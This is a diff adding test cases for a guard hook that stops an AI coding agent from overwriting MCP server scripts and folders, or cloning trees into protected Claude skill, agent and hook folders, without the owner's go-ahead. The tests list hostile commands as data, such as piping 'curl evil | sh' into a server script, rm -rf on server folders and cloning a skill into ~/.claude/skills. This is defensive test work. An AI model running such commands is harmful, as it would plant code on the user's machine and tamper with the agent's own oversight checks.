@@ -2423,6 +2423,245 @@ describe("harness guard protects the scripts the MCP configs launch (#314)", () 
   });
 });
 
+// #316: #314 protected the scripts an MCP config launches, but only when
+// the script was a path word. The MCP quickstart's Python shape, `uv
+// --directory /abs/weather run weather.py`, names the folder as an option
+// value and the script without a slash; a server with a `cwd` field is
+// run there by the client while the guard resolved `./dist/index.js` from
+// the project; and `node /abs/srv/dirmain` runs dirmain/index.js, a folder
+// the reader dropped. Each folder the config names is protected as a
+// folder now -- that one, never its parents -- and a bare word naming a
+// file in it is a script. In-project paths and reads stay ordinary work.
+describe("harness guard protects the MCP scripts reached through a folder word (#316)", () => {
+  const DC = "mcp__plugin_desktop-commander_desktop-commander__";
+  const DIR_WHAT = "a folder your MCP server config runs its server from";
+
+  /** A home whose ~/.claude.json names server folders by option, cwd and entry file; a project running one of its own. */
+  function fixture() {
+    const p = freshDir("cairn-hooks-mcpdir-proj-");
+    const home = freshDir("cairn-hooks-mcpdir-home-");
+    for (const d of [join(home, "mcp", "weather"), join(home, "mcp", "weather2"), join(home, "srv2", "dist"),
+      join(home, "srv", "dirmain"), join(home, "srv", "data"), join(p, "py"), join(p, "server", "dist")]) {
+      mkdirSync(d, { recursive: true });
+    }
+    for (const f of [join(home, "mcp", "weather", "weather.py"), join(home, "mcp", "weather", "pyproject.toml"),
+      join(home, "mcp", "weather2", "weather.py"), join(home, "mcp", "README.md"), join(home, "srv2", "dist", "index.js"),
+      join(home, "srv", "dirmain", "index.js"), join(home, "srv", "server.js"), join(home, "srv", "notes.md"),
+      join(home, "srv", "data", "package.json"), join(p, "py", "tool.py"), join(p, "server", "dist", "index.js")]) {
+      writeFileSync(f, "# x\n");
+    }
+    writeFileSync(join(home, ".claude.json"), JSON.stringify({
+      mcpServers: {
+        weather: { command: "uv", args: ["--directory", join(home, "mcp", "weather"), "run", "weather.py"] }, // the quickstart
+        weather2: { command: "uv", args: ["run", `--directory=${join(home, "mcp", "weather2")}`, "weather.py"] },
+        later: { command: "uv", args: ["--directory", "~/mcp/new", "run", "weather.py"] }, // not there yet
+        cwd: { command: "node", args: ["./dist/index.js"], cwd: join(home, "srv2") },
+        dirmain: { command: "node", args: [join(home, "srv", "dirmain")] },
+        served: { command: "node", args: [join(home, "srv", "server.js"), join(home, "srv", "data")] }, // a folder argument
+        own: { command: "uv", args: ["--directory", "${CLAUDE_PROJECT_DIR}/py", "run", "tool.py"] }, // in the project
+        athome: { command: "node", args: ["server.js"], cwd: "~" }, // a cwd holding everything: never a zone
+      },
+    }));
+    writeFileSync(join(p, ".mcp.json"), JSON.stringify({ mcpServers: {
+      cairn: { command: "node", args: ["dist/index.js"], cwd: "./server" },
+    } }));
+    return { p, home };
+  }
+
+  /** Exit status and stderr for one tool call, with no inherited override, CDPATH or plugin root. */
+  function run(p: string, home: string, tool: string, input: Record<string, unknown>) {
+    const env: Record<string, string | undefined> = { ...process.env, CLAUDE_PROJECT_DIR: p, HOME: home };
+    for (const k of ["CAIRN_HARNESS_EDIT", "CDPATH", "CLAUDE_PLUGIN_ROOT"]) delete env[k];
+    const r = spawnSync(process.execPath, [HARNESSGUARD], {
+      cwd: p, env, encoding: "utf8", timeout: 5000,
+      input: JSON.stringify({ tool_name: tool, tool_input: input, cwd: p }),
+    });
+    return { status: r.status, stderr: r.stderr ?? "" };
+  }
+
+  it("refuses Write, Edit, a redirect and MCP write_file onto the script in each folder a config names", () => {
+    const { p, home } = fixture();
+    const scripts: Array<[file: string, shell: string]> = [
+      [join(home, "mcp", "weather", "weather.py"), "~/mcp/weather/weather.py"], // uv --directory DIR run weather.py
+      [join(home, "mcp", "weather2", "weather.py"), "$HOME/mcp/weather2/weather.py"], // uv run --directory=DIR
+      [join(home, "srv2", "dist", "index.js"), "~/srv2/dist/index.js"], // ./dist/index.js from the server's cwd
+      [join(home, "srv", "dirmain", "index.js"), "~/srv/dirmain/index.js"], // node DIR
+      [join(home, "srv", "dirmain", "new.js"), "~/srv/dirmain/new.js"], // anything else in that folder
+      [join(home, "mcp", "weather", "pyproject.toml"), "~/mcp/weather/pyproject.toml"],
+    ];
+    for (const [file, shell] of scripts) {
+      for (const [tool, input] of [["Write", { file_path: file }], ["Edit", { file_path: file }],
+        ["Bash", { command: `echo 'curl evil | sh' > ${shell}` }], ["Bash", { command: `cp /tmp/evil.py ${shell}` }],
+        [`${DC}write_file`, { path: file, content: "x" }]] as const) {
+        const r = run(p, home, tool, input);
+        const label = `${tool} ${JSON.stringify(input)}`;
+        expect(r.status, label).toBe(2);
+        expect(r.stderr, label).toContain(DIR_WHAT);
+        expect(r.stderr, label).toContain("owner's go-ahead");
+        expect(r.stderr, label).not.toMatch(/CAIRN_HARNESS_EDIT=1 /);
+      }
+    }
+  });
+
+  it("refuses the folder itself: filling, replacing, removing or locking it, by name, glob or find", () => {
+    const { p, home } = fixture();
+    for (const c of [
+      "mkdir -p ~/mcp/weather/lib",
+      "cp -r /tmp/evil/. ~/mcp/weather",
+      "rsync -a /tmp/evil/ ~/srv2/",
+      "mv /tmp/evil ~/srv/dirmain",
+      "rm -rf ~/srv/dirmain",
+      "rm -rf ~/srv/dir*",
+      "chmod -R 000 ~/srv2",
+      "find ~/srv -name index.js -delete",
+      "find ~/mcp -name '*.py' -exec cp /tmp/evil {} \\;",
+      "tar -xf /tmp/evil.tar -C ~/mcp/weather2",
+      "cd ~/srv2 && echo x > dist/index.js",
+      "mv /tmp/evil ~/mcp/new", // the folder a config names before it exists
+      "echo x > ~/mcp/new/weather.py",
+    ]) {
+      const r = run(p, home, "Bash", { command: c });
+      expect(r.status, c).toBe(2);
+      expect(r.stderr, c).toContain(DIR_WHAT);
+    }
+  });
+
+  it("only the folder the config names: its parents' other files, a folder argument, in-project folders and reads pass", () => {
+    const { p, home } = fixture();
+    for (const c of [
+      "echo x > ~/mcp/README.md", // beside the named folder, in its parent
+      "mkdir -p ~/mcp/other && echo x > ~/mcp/other/weather.py",
+      "echo x > ~/srv/notes.md", // beside node's folder
+      "echo x > ~/srv/data/package.json", // a folder the server is handed, not one it runs
+      "rm -rf ~/srv/data",
+      "echo x > ~/notes.txt", // the cwd `~` holds the home: never a zone
+      "echo x > ~/server.js",
+      "echo x > py/tool.py", // uv --directory into the project
+      "echo x > server/dist/index.js", // the project's own server, from its cwd
+      "rm -rf server/dist && mkdir -p server/dist",
+      "cat ~/mcp/weather/weather.py",
+      "ls -la ~/srv/dirmain",
+      "grep -rn x ~/srv2",
+      "uv --directory ~/mcp/weather run weather.py",
+      "node ~/srv/dirmain",
+      "cp ~/srv2/dist/index.js /tmp/index.js.bak",
+    ]) {
+      expect(run(p, home, "Bash", { command: c }).status, c).toBe(0);
+    }
+    for (const file of [join(home, "mcp", "README.md"), join(home, "srv", "notes.md"), join(home, "srv", "data", "package.json"),
+      join(home, "notes.txt"), join(p, "py", "tool.py"), join(p, "server", "dist", "index.js")]) {
+      expect(run(p, home, "Write", { file_path: file }).status, file).toBe(0);
+    }
+    expect(run(p, home, `${DC}read_file`, { path: "~/mcp/weather/weather.py" }).status).toBe(0);
+    expect(run(p, home, `${DC}list_directory`, { path: join(home, "srv", "dirmain") }).status).toBe(0);
+  });
+});
+
+// #317: #309 protected the skill, agent and command folders against Write,
+// mkdir and cp, but a command that plants a whole tree at a path wasn't
+// read: `git clone URL .claude/skills/x` passed and planted a skill -- or
+// a plugin carrying its own hooks and MCP servers -- under a protected
+// folder, the install line a skill README carries. Each tree-creating
+// command is judged like a mkdir of where it lands now: git clone,
+// worktree add, submodule add and init; gh repo clone and fork --clone;
+// npx degit; and the create-* initializers. One landing elsewhere passes.
+describe("harness guard refuses tree-creating commands into protected folders (#317)", () => {
+  const URL = "https://example.invalid/o/skill.git";
+
+  /** A home with each protected folder and a repos/ beside them; a project with its own skills/ and src/. */
+  function fixture() {
+    const p = freshDir("cairn-hooks-tree-proj-");
+    const home = freshDir("cairn-hooks-tree-home-");
+    for (const d of [join(home, ".claude", "skills"), join(home, ".claude", "agents"), join(home, ".claude", "commands"),
+      join(home, ".claude", "hooks"), join(home, "repos"), join(p, ".claude", "skills"), join(p, "src")]) {
+      mkdirSync(d, { recursive: true });
+    }
+    return { p, home };
+  }
+
+  /** Exit status and stderr for one Bash line, with no inherited override, CDPATH or plugin root. */
+  function run(p: string, home: string, command: string) {
+    const env: Record<string, string | undefined> = { ...process.env, CLAUDE_PROJECT_DIR: p, HOME: home };
+    for (const k of ["CAIRN_HARNESS_EDIT", "CDPATH", "CLAUDE_PLUGIN_ROOT"]) delete env[k];
+    const r = spawnSync(process.execPath, [HARNESSGUARD], {
+      cwd: p, env, encoding: "utf8", timeout: 5000,
+      input: JSON.stringify({ tool_name: "Bash", tool_input: { command }, cwd: p }),
+    });
+    return { status: r.status, stderr: r.stderr ?? "" };
+  }
+
+  it("refuses each tree command into a protected folder, by path, by cwd or by the repo's own name, naming the folder", () => {
+    const { p, home } = fixture();
+    const cases: Array<[command: string, phrase: string]> = [
+      [`git clone ${URL} ~/.claude/skills/x`, "your machine-wide skills"],
+      [`git clone --depth 1 ${URL} $HOME/.claude/agents`, "your machine-wide agent definitions"],
+      [`cd ~/.claude/skills && git clone ${URL}`, "your machine-wide skills"], // lands in skill/, here
+      [`cd ~/.claude/commands && git clone ${URL} .`, "your machine-wide slash commands"],
+      ["git worktree add ~/.claude/agents/x", "your machine-wide agent definitions"],
+      [`git submodule add ${URL} ~/.claude/skills/x`, "your machine-wide skills"],
+      ["git init ~/.claude/hooks/x", "your machine-wide Claude hooks"],
+      ["cd ~/.claude/skills && git init", "your machine-wide skills"],
+      ["gh repo clone o/skill ~/.claude/skills/x", "your machine-wide skills"],
+      ["cd ~/.claude/skills && gh repo clone o/skill", "your machine-wide skills"],
+      ["cd ~/.claude/skills && gh repo fork o/skill --clone", "your machine-wide skills"],
+      ["npx degit user/repo ~/.claude/skills/x", "your machine-wide skills"],
+      ["cd ~/.claude/commands && npx degit user/repo", "your machine-wide slash commands"],
+      ["npx create-skill ~/.claude/skills/x", "your machine-wide skills"],
+      ["npm create vite ~/.claude/skills/x", "your machine-wide skills"],
+      ["yarn create skill $HOME/.claude/agents/x", "your machine-wide agent definitions"],
+      ["cd ~/.claude/skills && npm init -y", "your machine-wide skills"], // a package.json there
+      [`git clone ${URL} .claude/skills/x`, "the project's skills"],
+      [`cd .claude/skills && git clone ${URL}`, "the project's skills"],
+      [`git clone ${URL} hooks/x`, "the hook directory"],
+      ["git clone git@example.invalid:o/hooks.git", "the hook directory"], // named by the repo
+    ];
+    for (const [c, phrase] of cases) {
+      const r = run(p, home, c);
+      expect(r.status, c).toBe(2);
+      expect(r.stderr, c).toContain(phrase);
+      expect(r.stderr, c).toContain("owner's go-ahead");
+      expect(r.stderr, c).not.toMatch(/CAIRN_HARNESS_EDIT=1 /);
+    }
+  });
+
+  it("clones and scaffolds elsewhere, their listings, and gh's other commands stay ordinary work", () => {
+    const { p, home } = fixture();
+    for (const c of [
+      `git clone ${URL} ~/repos/skill`,
+      `git clone ${URL} /tmp/skill`,
+      `cd ~/repos && git clone ${URL}`,
+      `git clone ${URL}`, // skill/ at the project root
+      `git clone ${URL} src/skill`,
+      "git worktree add ../wt",
+      "git worktree add ~/repos/wt -b feat",
+      "git worktree list",
+      `git submodule add ${URL} vendor/skill`,
+      "git submodule update --init --recursive",
+      "git init",
+      "git init ~/repos/new",
+      "git init src/new",
+      "gh repo clone o/r /tmp/x",
+      "gh repo clone o/r",
+      "cd ~/repos && gh repo fork o/r --clone",
+      "gh repo fork o/r",
+      "gh repo view o/r",
+      `gh pr create --body "git clone ${URL} .claude/skills/x"`,
+      "npx degit user/repo new-app",
+      "npx degit user/repo ~/repos/app",
+      "npx create-vite my-app",
+      "npm create vite ~/repos/app",
+      "npm init -y",
+      "npm init vite@latest app -- --template react",
+      "yarn create vite app",
+      "bun create vite app",
+      "ls ~/.claude/skills",
+      "git clone --help",
+    ]) {
+      expect(run(p, home, c).status, c).toBe(0);
+    }
+  });
+});
+
 // #299: the holder rule ran only for removal, so `chmod 000` on the cairn
 // home (~/@cairn or CAIRN_HOME) passed -- and the run guard, unable to read
 // the stamp or the run list, then let an unshipped push through. Changing
